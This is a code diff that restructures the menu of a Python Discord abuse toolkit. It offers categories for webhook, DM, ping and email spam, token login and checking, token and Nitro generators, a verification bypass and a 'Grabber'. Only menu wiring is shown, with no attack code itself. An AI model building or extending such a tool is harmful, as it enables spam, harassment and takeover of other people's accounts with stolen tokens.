@@ -544,43 +544,115 @@ def main_menu():
         print_banner(show_webhook=True)
         questions = [
             inquirer.List('choice',
-                         message="Select a feature:",
+                         message="Choose a category:",
                          choices=[
-                             'Discord Webhook Spammer',
-                             'Nitro Generator & Checker',
-                             'Token Generator',
-                             'Token Info',
-                             'Token Login',
-                             'Close All DMs',
-                             'Unfriend All Friends',
-                             'DM All Friends',
-                             'Delete/Leave All Servers',
-                             'Theme Spammer',
-                             'Server Cloner',
-                             'Webhook Deleter',
-                             'Grabber',
-                             'Exit'
+                             '🔥 Spam Tools',
+                             '🎮 Discord Tools', 
+                             '🔐 Token Tools',
+                             '🛠️ Server Tools',
+                             '👤 User Tools',
+                             '⚙️ Settings Tools',
+                             '💎 Generators',
+                             '🕵️ Grabber',
+                             '❌ Exit'
                          ]),
         ]
         answers = inquirer.prompt(questions)
-        if not answers or answers['choice'] == 'Exit':
+        if not answers or answers['choice'] == '❌ Exit':
             print_banner()
-            pretty_print("Goodbye! 👋", (255,32,32))
+            pretty_print("See you later!   <3👋", (255,32,32))
             break
+            
+        if answers['choice'] == '🔥 Spam Tools':
+            spam_tools_menu()
+        elif answers['choice'] == '🎮 Discord Tools':
+            discord_tools_menu()
+        elif answers['choice'] == '🔐 Token Tools':
+            token_tools_menu()
+        elif answers['choice'] == '🛠️ Server Tools':
+            server_tools_menu()
+        elif answers['choice'] == '👤 User Tools':
+            user_tools_menu()
+        elif answers['choice'] == '⚙️ Settings Tools':
+            settings_tools_menu()
+        elif answers['choice'] == '💎 Generators':
+            generators_menu()
+        elif answers['choice'] == '🕵️ Grabber':
+            grabber_menu()
+
+def spam_tools_menu():
+    while True:
+        print_banner(show_webhook=True)
+        questions = [
+            inquirer.List('choice',
+                         message="Spam Tools - Choose an option:",
+                         choices=[
+                             'Discord Webhook Spammer',
+                             'Theme Spammer',
+                             'Ping Spam',
+                             'Channel Spam',
+                             'DM Spam',
+                             'Friend Request Spam',
+                             'Email Spam',
+                             '← Back to main menu'
+                         ]),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['choice'] == '← Back to main menu':
+            break
+            
         if answers['choice'] == 'Discord Webhook Spammer':
             webhook_spammer_menu()
-        elif answers['choice'] == 'Nitro Generator & Checker':
-            run_nitro_generator()
-        elif answers['choice'] == 'Token Generator':
-            run_token_generator()
-        elif answers['choice'] == 'Token Info':
-            token = ask_token()
-            if token:
-                from utils.token_info import display_token_info
-                display_token_info(token)
-        elif answers['choice'] == 'Token Login':
-            token_login_menu()
-        elif answers['choice'] == 'Close All DMs':
+        elif answers['choice'] == 'Theme Spammer':
+            theme_spam_menu()
+        elif answers['choice'] == 'Ping Spam':
+            from utils.ping_spam import run_ping_spam
+            run_ping_spam()
+        elif answers['choice'] == 'Channel Spam':
+            from utils.channel_spam import run_channel_spam
+            run_channel_spam()
+        elif answers['choice'] == 'DM Spam':
+            from utils.dm_spam import run_dm_spam
+            run_dm_spam()
+        elif answers['choice'] == 'Friend Request Spam':
+            from utils.friend_request_spam import run_friend_request_spam
+            run_friend_request_spam()
+        elif answers['choice'] == 'Email Spam':
+            from utils.email_spam import run_email_spam
+            run_email_spam()
+            
+        questions = [
+            inquirer.List('continue',
+                         message="Back to Spam Tools menu?",
+                         choices=['Yes', 'No'],
+                         ),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['continue'] == 'No':
+            break
+
+def discord_tools_menu():
+    while True:
+        print_banner(show_webhook=True)
+        questions = [
+            inquirer.List('choice',
+                         message="Discord Tools - Choose an option:",
+                         choices=[
+                             'Close All DMs',
+                             'Unfriend All Friends', 
+                             'DM All Friends',
+                             'Delete/Leave All Servers',
+                             'Mass Join/Leave',
+                             'Mass React',
+                             'Verification Bypass',
+                             '← Back to main menu'
+                         ]),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['choice'] == '← Back to main menu':
+            break
+            
+        if answers['choice'] == 'Close All DMs':
             token = ask_token()
             if token:
                 from utils.close_dms import close_all_dms
@@ -610,24 +682,194 @@ def main_menu():
                 pretty_print(f"- {left} servers left", (0,255,0))
                 pretty_print(f"- {failed} errors", (255,0,0))
                 pretty_print(f"- {total} servers total", (0,255,0))
-        elif answers['choice'] == 'Theme Spammer':
-            theme_spam_menu()
-        elif answers['choice'] == 'Server Cloner':
-            server_cloner_menu()
-        elif answers['choice'] == 'Webhook Deleter':
-            webhook_deleter_menu()
-        elif answers['choice'] == 'Grabber':
-            grabber_menu()
+        elif answers['choice'] == 'Mass Join/Leave':
+            from utils.mass_join_leave import run_mass_join_leave
+            run_mass_join_leave()
+        elif answers['choice'] == 'Mass React':
+            from utils.mass_react import run_mass_react
+            run_mass_react()
+        elif answers['choice'] == 'Verification Bypass':
+            from utils.verification_bypass import run_verification_bypass
+            run_verification_bypass()
+                
         questions = [
             inquirer.List('continue',
-                         message="Return to main menu?",
+                         message="Back to Discord Tools menu?",
                          choices=['Yes', 'No'],
                          ),
         ]
         answers = inquirer.prompt(questions)
         if not answers or answers['continue'] == 'No':
-            print_banner()
-            pretty_print("Goodbye! 👋", (255,32,32))
+            break
+
+def token_tools_menu():
+    while True:
+        print_banner(show_webhook=True)
+        questions = [
+            inquirer.List('choice',
+                         message="Token Tools - Choose an option:",
+                         choices=[
+                             'Token Info',
+                             'Token Login',
+                             'Token Checker',
+                             '← Back to main menu'
+                         ]),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['choice'] == '← Back to main menu':
+            break
+            
+        if answers['choice'] == 'Token Info':
+            token = ask_token()
+            if token:
+                from utils.token_info import display_token_info
+                display_token_info(token)
+        elif answers['choice'] == 'Token Login':
+            token_login_menu()
+        elif answers['choice'] == 'Token Checker':
+            from utils.token_checker import run_token_checker
+            run_token_checker()
+            
+        questions = [
+            inquirer.List('continue',
+                         message="Back to Token Tools menu?",
+                         choices=['Yes', 'No'],
+                         ),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['continue'] == 'No':
+            break
+
+def server_tools_menu():
+    while True:
+        print_banner(show_webhook=True)
+        questions = [
+            inquirer.List('choice',
+                         message="Server Tools - Choose an option:",
+                         choices=[
+                             'Server Cloner',
+                             'Webhook Deleter',
+                             'Server Management',
+                             '← Back to main menu'
+                         ]),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['choice'] == '← Back to main menu':
+            break
+            
+        if answers['choice'] == 'Server Cloner':
+            server_cloner_menu()
+        elif answers['choice'] == 'Webhook Deleter':
+            webhook_deleter_menu()
+        elif answers['choice'] == 'Server Management':
+            from utils.server_management import run_server_management
+            run_server_management()
+            
+        questions = [
+            inquirer.List('continue',
+                         message="Back to Server Tools menu?",
+                         choices=['Yes', 'No'],
+                         ),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['continue'] == 'No':
+            break
+
+def user_tools_menu():
+    while True:
+        print_banner(show_webhook=True)
+        questions = [
+            inquirer.List('choice',
+                         message="User Tools - Choose an option:",
+                         choices=[
+                             'Custom Status Changer',
+                             'Nickname Changer',
+                             'Avatar Changer',
+                             '← Back to main menu'
+                         ]),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['choice'] == '← Back to main menu':
+            break
+            
+        if answers['choice'] == 'Custom Status Changer':
+            from utils.status_changer import run_status_changer
+            run_status_changer()
+        elif answers['choice'] == 'Nickname Changer':
+            from utils.nickname_changer import run_nickname_changer
+            run_nickname_changer()
+        elif answers['choice'] == 'Avatar Changer':
+            from utils.avatar_changer import run_avatar_changer
+            run_avatar_changer()
+            
+        questions = [
+            inquirer.List('continue',
+                         message="Back to User Tools menu?",
+                         choices=['Yes', 'No'],
+                         ),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['continue'] == 'No':
+            break
+
+def settings_tools_menu():
+    while True:
+        print_banner(show_webhook=True)
+        questions = [
+            inquirer.List('choice',
+                         message="Settings Tools - Choose an option:",
+                         choices=[
+                             'Language & Theme Spam',
+                             '← Back to main menu'
+                         ]),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['choice'] == '← Back to main menu':
+            break
+            
+        if answers['choice'] == 'Language & Theme Spam':
+            from utils.settings_spam import run_settings_spam
+            run_settings_spam()
+            
+        questions = [
+            inquirer.List('continue',
+                         message="Back to Settings Tools menu?",
+                         choices=['Yes', 'No'],
+                         ),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['continue'] == 'No':
+            break
+
+def generators_menu():
+    while True:
+        print_banner(show_webhook=True)
+        questions = [
+            inquirer.List('choice',
+                         message="Generators - Choose an option:",
+                         choices=[
+                             'Nitro Generator & Checker',
+                             'Token Generator',
+                             '← Back to main menu'
+                         ]),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['choice'] == '← Back to main menu':
+            break
+            
+        if answers['choice'] == 'Nitro Generator & Checker':
+            run_nitro_generator()
+        elif answers['choice'] == 'Token Generator':
+            run_token_generator()
+            
+        questions = [
+            inquirer.List('continue',
+                         message="Back to Generators menu?",
+                         choices=['Yes', 'No'],
+                         ),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['continue'] == 'No':
             break
 
 if __name__ == "__main__":
